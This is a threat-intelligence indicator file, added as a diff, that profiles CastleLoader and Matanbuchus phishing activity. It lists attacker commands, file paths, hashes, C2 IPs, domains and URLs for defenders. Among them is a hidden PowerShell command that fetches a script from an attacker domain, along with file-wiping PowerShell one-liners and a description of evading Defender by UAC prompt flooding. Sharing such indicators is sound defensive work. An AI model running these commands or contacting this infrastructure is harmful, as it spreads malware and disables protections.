@@ -1,0 +1,471 @@
+description: Phishing email management tooling used by threat actors linked to Cluster
+  2.Matanbuchus Activity and Booking.com-themed Infrastructure. Matanbuchus is a C-based
+  downloader MaaS.
+attribution: Cluster 2.Matanbuchus Activity
+malware_families:
+- CastleLoader
+- Matanbuchus
+- CastleRAT
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - pythonw.exe
+  - update.exe
+  commandline:
+  - pythonw.exe newtag.zip
+  - powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File boiksal[.]com/upd
+  - 'rundll32 "C:\\Windows\\System32\\shell32.dll" #61'
+  - 'SHELL64_OFFSET = '
+  - 'SHELL32_OFFSET = '
+  - SHELLFUNC = WINFUNCTYPE
+  - LoadPE_Shell
+  - crt = WinDLL("msvcrt.dll");
+  - OPEN_EXISTING
+  - powershell Start-Sleep -Seconds 4; Remove-Item -Path * -Force; exit
+  - powershell Start-Sleep -Seconds 3; Remove-Item -Path * -Force
+  - '"%ws" -no-deelevate'
+  powershell:
+  - Retrieves and executes a .NET loader that repeatedly spawns new PowerShell processes
+    to add Windows Defender exclusions for the eventual payload (update.exe) using
+    a UAC prompt flooding loop. Once exclusions are applied, the loader decrypts and
+    launches the CastleLoader payload.
+  - Start-Sleep -Seconds 4; Remove-Item -Path * -Force; exit
+  - Start-Sleep -Seconds 3; Remove-Item -Path * -Force
+  scripting_engine:
+  - Python
+  registry_keys: []
+  image_load:
+  - DonutLoader
+  - libcurl.dll
+  network_connections:
+  - 104.225.129.171
+  - 144.208.126.50
+  - 195.85.115.44
+  - 77.238.241.203:443
+  - 5.35.44.176
+  - powershell.exe, mechiraz[.]com, 80
+  - powershell.exe, programsbookss[.]com, 80
+  - 74.119.239.234
+  - 78.153.155.131
+  - 162.215.230.96
+  - 162.215.230.150
+  - 162.215.241.46
+  - 162.215.241.215
+  - 162.251.80.108
+  - 185.236.20.154
+  - 192.124.178.74
+  - 199.79.62.141
+  - 204.11.58.80
+  - 207.174.212.141
+  - 77.83.207.55
+  - 185.39.19.180
+  - 185.39.19.181
+  - 109.104.153.29
+  - 109.104.153.100
+  - 109.104.153.193
+  - 109.104.154.67
+  - 80.64.18.245
+  - 85.208.84.65
+  - 88.214.50.83
+  - 185.39.19.94
+  - 178.17.57.103
+  - 192.109.138.102
+  - 34.72.90.40
+  - 45.11.180.174
+  - 45.11.180.198
+  - 45.11.181.59
+  - 45.32.69.114
+  - 45.61.136
+  - tcp $HOME_NET any -> $EXTERNAL_NET any
+  - udp $EXTERNAL_NET any -> $HOME_NET any
+  file_activity:
+  - newtag.zip
+  - DonutLoader
+  - libcurl.dll
+  - update.exe
+  - C:\\Windows\\System32\\cmd.exe
+  - C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+  - newtag.zip[identifier].[base_name].[main_domain]update.exe
+  - C:\\AppData\\Local\\Temp\\MuuuuuhGer3
+  - C:\\AppData\\Local\\Temp\\PluhhSuk3
+  - C:\\AppData\\Local\\Temp\\AsdDsaHaha3
+  - C:\\AppData\\Local\\Temp\\ChuChuka
+  - C:\\AppData\\Local\\Temp\\GagikMaraguiSS
+  - C:\\AppData\\Local\\Temp\\LowUshrSudujes
+  - C:\\AppData\\Local\\Temp\\RarnuiKarta
+  - C:\\AppData\\Local\\Temp\\GrazGraznii
+  - C:\\AppData\\Local\\Temp\\GiveGvein3
+  - C:\\AppData\\Local\\Temp\\BeruiowdgsouiHTR
+  - C:\\AppData\\Local\\Temp\\GDSongdsgndohSDU
+  - C:\\AppData\\Local\\JohniiDepp
+  - C:\\AppData\\Local\\LuchiiSvet
+  - C:\\AppData\\Local\\HmmMaybe
+  persistence:
+  - Adding Windows Defender exclusions using UAC prompt flooding loop
+  process_relations: []
+IOCs:
+  hashes:
+  - d87ccd5a2911e46a1efbc0ef0cfe095f136de98df055eacd1c82de76ae6fecec
+  - 1b6befc65b19a63b4131ce5bcc6e8c0552fe1e1d136ab94bc7d81b3924056156
+  - 202f6b6631ade2c41e4762e5877ce0063a3beabce0c3f8564b6499a1164c1e04
+  - 25e0008aba82690e0f58c9d9fcfbc5d49820aa78d2f7bfcd0b85fb969180fc04
+  - b45cce4ede6ffb7b6f28f75a0cbb60e65592840d98dcb63155b9fa0324a88be2
+  - fb9de7448e9e30f717c171f1d1c90ac72828803a16ad385757aeecc853479d3c
+  - 6444f0e3f78254aef663837562d258a2236a77f810ee8d832de7d83e0fdd5783
+  - 94dc0f696a46f3c225b0aa741fbd3b8997a92126d66d7bc7c9dd8097af0de52a
+  - 53775af67e9df206ed3f9c0a3756dbbc4968a77b1df164e9baddb51e61ac82df
+  - 1ff6ee23b4cd9ac90ee569067b9e649c76dafac234761706724ae0c1943e4a75
+  - e6bcdf375649a7cbf092fcab65a24d832d8725d833e422e28dfa634498b00928
+  - 67cf6d5332078ff021865d5fef6dc61e90b89bc411d8344754247ccd194ff65b
+  - 963c012d56c62093d105ab5044517fdcce4ab826f7782b3e377932da1df6896d
+  - 60125159523c356d711ffa1076211359906e6283e25f75f4cf0f9dc8da6bf7b0
+  - cf202498b85e6f0ae4dffae1a65acbfec78cc39fce71f831d45f916c7dedfa0c
+  - 058d83fd8834246d6d2a2771e6e0aeb4d4ef8a6984cbe1133f3a569029a4b1f7
+  - 190e673787bfc6e8eeebccd64c8da61747d5be06f87d3aea879118ef1a9f4836
+  ip_addresses:
+  - 104.225.129.171
+  - 144.208.126.50
+  - 195.85.115.44
+  - 77.238.241.203
+  - 5.35.44.176
+  - 89.185.84.211
+  - 185.39.19.164
+  - 5.178.1.8
+  - 102.135.95.102
+  - 168.100.8.84
+  - 178.17.57.102
+  - 178.17.57.153
+  - 185.125.50.125
+  - 185.149.146.118
+  - 185.156.248.241
+  - 185.196.9.80
+  - 185.196.9.222
+  - 185.196.10.81
+  - 185.196.11.171
+  - 185.208.158.250
+  - 192.109.138.102
+  - 192.153.57.125
+  - 194.76.227.242
+  - 195.149.146.118
+  - 195.201.108.189
+  - 195.211.97.51
+  - 31.58.50.160
+  - 31.58.87.132
+  - 45.11.183.194
+  - 45.11.183.45
+  - 45.11.183.165
+  - 45.155.249.121
+  - 80.77.25.88
+  - 80.77.25.114
+  - 80.77.25.239
+  - 107.158.128.26
+  - 147.45.177.127
+  - 170.130.165.201
+  - 172.86.90.58
+  - 173.44.141.52
+  - 185.121.234.141
+  - 74.119.239.234
+  - 78.153.155.131
+  - 162.215.230.96
+  - 162.215.230.150
+  - 162.215.241.46
+  - 162.215.241.215
+  - 162.251.80.108
+  - 185.236.20.154
+  - 192.124.178.74
+  - 199.79.62.141
+  - 204.11.58.80
+  - 207.174.212.141
+  - 77.83.207.55
+  - 185.39.19.180
+  - 185.39.19.181
+  - 109.104.153.29
+  - 109.104.153.100
+  - 109.104.153.193
+  - 109.104.154.67
+  - 80.64.18.245
+  - 85.208.84.65
+  - 88.214.50.83
+  - 185.39.19.94
+  - 178.17.57.103
+  - 34.72.90.40
+  - 45.11.180.174
+  - 45.11.180.198
+  - 45.11.181.59
+  - 45.32.69.114
+  - 45.61.136
+  - 45.61.136.81
+  - 45.134.26.41
+  - 45.135.232.149
+  - 45.144.53.62
+  - 46.28.67.226
+  - 46.52.80.121
+  - 66.63.187.224
+  - 67.217.228.198
+  - 77.90.153.43
+  - 79.132.130.148
+  - 79.132.131.200
+  - 85.192.49.68
+  - 85.208.84.115
+  - 87.120.93.167
+  - 91.202.233.132
+  - 91.202.233.250
+  - 94.141.122.164
+  - 78.115.3.113
+  domains:
+  - oldspicenotsogood.shop
+  - testdomain123123.shop
+  - englandlogistics.com
+  - englandloglstics.com
+  - loadstracking.com
+  - apps.englandlogistics.rateconfirmations.com
+  - apps.england.loadstracking.com
+  - cdlfreightlogistics.com
+  - hometownlogisticsllc.com
+  - dat.com
+  - loadlink.ca
+  - mechiraz[.]com
+  - nicewk[.]com
+  - galaxioflow[.]com
+  - nimbusvaults[.]com
+  - update-info4468765[.]com
+  - boiksal[.]com
+  - programsbookss[.]com
+  - wereatwar[.]com
+  - alafair[.]net
+  - anotherproject[.]icu
+  - bthschwier[.]com
+  - campanyasoft[.]com
+  - castlppwnd[.]com
+  - donttouchme[.]life
+  - donttouchthisisuseless[.]icu
+  - doyoureallyseeme[.]icu
+  - dpeformse[.]com
+  - antseeyou[.]icu
+  - oldspicenotsogood[.]shop
+  - rcpeformse[.]com
+  - roject0[.]com
+  - speatly[.]com
+  - touchmeplease[.]icu
+  - autryjones.com
+  - gabesworld.com
+  - justnewdmain.com
+  - kakapupuneww.com
+  - miteamss.com
+  - programsbookss.com
+  - tdbfvgwe456yt.com
+  - treetankists.com
+  - alafair.net
+  - anotherproject.icubethschwier.com
+  - campanyasoft.com
+  - castlppwnd.com
+  - donttouchme.lifedonttouchthisisuseless.icu
+  - doyoureallyseeme.icu
+  - dopeperformse.icu
+  - antseeyou.icu
+  - rcpeformse.icu
+  - roject0.com
+  - speatly.com
+  - touchmeplease.icu
+  - wereatwar.icu
+  - albafood.shop
+  - albalk.lol
+  - bdeskthebest.shop
+  - bestproxysale.shop
+  - bestvpninfo.shop
+  - chessinthenight.lol
+  - clgenetics.shop
+  - docusign.home
+  - sdubaialbafood.shop
+  - easyadvicesforyou.shop
+  - easyprintscreen.shop
+  - funjobcollins.shop
+  - nort-secure.shop
+  - norton-secure.shop
+  - notstablecoin.xyz
+  - notusdt.lol
+  - nvidblog.shop
+  - nvldlainfoblog.shop
+  - starkforeveryone.lol
+  - sweetdevices.lol
+  - tradeviewdesktop.shop
+  - tradlngview-desktop.biz
+  - tradlingvlewdesktop.shop
+  - tradview-desktop.shop
+  - vipcinemade.shop
+  - vipcinemadubai.shop
+  - vipdubaicinema.shop
+  - dperforms.info
+  - englanglogistlcs.com
+  - leemanlogisticsinc.com
+  - loadplannig.com
+  - loads.icu
+  - loadsplanning.com
+  - loadsschedule.com
+  - loadstrucking.com
+  - mcentireinc.com
+  - mcloads.com
+  - mlxfreightinc.com
+  - mrlogsol.capinaccletruckllc.com
+  - rateconfirmations.com
+  - redlightninglogistics.com
+  - redlightninglogisticsinc.com
+  - starshiplogisticsgroupllc.com
+  - tenderloads.com
+  - trucksscheduling.com
+  - checkinastayverify.com
+  - checkinstayverify.com
+  - checkistayverify.com
+  - checkstayverify.com
+  - checksstayverify.com
+  - checkystayverify.com
+  - confirmahotelastay.com
+  - confirmahotelstay.com
+  - confirmhotelestay.com
+  - confirmhotelistay.com
+  - confirmhotelystay.com
+  - confirmstayon.com
+  - confirmstayonline.com
+  - confirmyhotelstay.com
+  - guestaformahub.com
+  - guestaformhub.com
+  - guestaformsafe.com
+  - guestaportalverify.com
+  - guestaverifyportal.com
+  - guestformahub.com
+  - guestformasafe.com
+  - guestformhub.com
+  - guestformsafe.com
+  - guestistayhotel.com
+  - guestportalverify.com
+  - gueststayhotel.com
+  - guestverifyhub.com
+  - guestverifylink.com
+  - guestverifyportal.com
+  - guestystayhotel.com
+  - guesutastayhotel.com
+  - guesytastayhotel.com
+  - hoteliguestverify.com
+  - hotelistayverify.com
+  - hotelyguestverify.com
+  - hotelystayverify.com
+  - nedpihotel.com
+  - pilolhotel.com
+  - roomiverifaccess.com
+  - roomverifaccess.com
+  - roomverifiaccess.com
+  - servicehotelonline.com
+  - verifihubguest.com
+  - verifyhubguest.com
+  - bioskbd.com
+  - blkiesf.com
+  - comboikfrs.com
+  - comboiksal.com
+  - bookingnewprice109034.icu
+  - bookingnewprice204167.icu
+  - guest-request16433.com
+  - guest-request44565494.com
+  - guest-request64533.com
+  - guest-request666543.com
+  - guest-request677653.com
+  - guest-update666532345.com
+  - hotelroomprice1039375.icu
+  - info-guest44567645.com
+  - info676345677.com
+  - newmessage10294.com
+  - request-info3444.com
+  - request-info4433345.com
+  - request345553.com
+  - request44456776.com
+  - update-gues3429.com
+  - update-guest4398317809.com
+  - update-info14546.com
+  - update-info3458421.com
+  - update-info4467.com
+  - update-info4468765.com
+  - update-info539156.com
+  - update-info71556.com
+  - update-reques898665.com
+  - galaxioflow.com
+  - mechiraz.com
+  - nicewk.com
+  - nimbusvaults.com
+  - steamcommunity.com
+  - anotherproject.icu
+  - bthschwier.com
+  - donttouchme.life
+  - donttouchthisisuseless.icu
+  - doperformse.icu
+  - tradlngvlewdesktop.shop
+  - loadschedule.com
+  - cik-ed.com
+  - cut-gv.com
+  - dip-bo.com
+  - dok-ol.com
+  - dut-cd.com
+  - eta-cd.com
+  - eto-sa.com
+  - fir-vp.com
+  - for-es.com
+  - gir-vc.com
+  - gut-bk.com
+  - her-op.com
+  - ipk-sa.com
+  - itp-ce.com
+  - kil-it.com
+  - kip-er.com
+  - mac-ig.com
+  - map-nv.com
+  - ned-uj.com
+  - otr-gl.com
+  - pit-kp.com
+  - rol-vd.com
+  - site-bila.com
+  - site-here.com
+  - site-reto.com
+  - site-tilo.com
+  - site-wila.com
+  - spu-cr.com
+  - tam-cg.com
+  - uke-sd.com
+  - uki-fa.com
+  - wal-ik.com
+  - xut-uv.com
+  - xyt-ko.com
+  - ykl-vh.com
+  - yt-ko.com
+  - zit-fl.com
+  - www.ip-api.com
+  - hometownlogisticslic.com
+  - mrlogisticsolutionslic.com
+  urls:
+  - hxxps://steamcommunity[.]com/id/desdsfds34324y3gh
+  - hxxps://steamcommunity[.]com/id/fio34h8dsh3iufsh
+  - hxxps://steamcommunity[.]com/id/jeg238r7staf378sh
+  - hxxps://steamcommunity[.]com/id/krouvhsin34287f7h3h
+  - hxxps://steamcommunity[.]com/id/tfy5d6gohu8tgy687r7
+  - hxxps://steamcommunity.com/id/desdsfds34324y3gh
+  - hxxps://steamcommunity.com/id/fio34h8dsh3iufsh
+  - hxxps://steamcommunity.com/id/jeg238r7staf378sh
+  - hxxps://steamcommunity.com/id/krouvhsin34287f7h3h
+  - hxxps://steamcommunity.com/id/tfy5d6gohu8tgy687r7
+  - hxxps://steamcommunity.com/id/desdsfds34324y3g
+  - hxxps://steamcommunity.com/id/krouvhsin34287f7h3
+  - https://tria.ge/250701-v6911aykv9
+  - https://tria.ge/250808-w4hpeaxtcw
+  - https://tria.ge/250822-vwt7ssxly9
+  - https://tria.ge/250813-a7c3fadl7z
+  - https://www.morphisec.com/blog/ransomware-threat-matanbuchus-3-0-maas-levels-up
+  - https://tria.ge/240328-t4ge8sbf65
+  - https://www.ibm.com/think/x-force/dissecting-castlebot-maas-operation
+  - https://catalyst.prodaft.com/public/report/understanding-current-castleloader-campaigns/overview
+  - http://78.115.3.113/service/download/p2.tar
+authors:
+- Insikt Group
+- Insikt Group, Recorded Future
+- MGUT
+- Recorded Future
+reference: https://www.recordedfuture.com/research/graybravos-castleloader-activity-clusters-target-multiple-industries
+date_of_publication: October 09, 2025
+file_creation_date: December 10, 2025
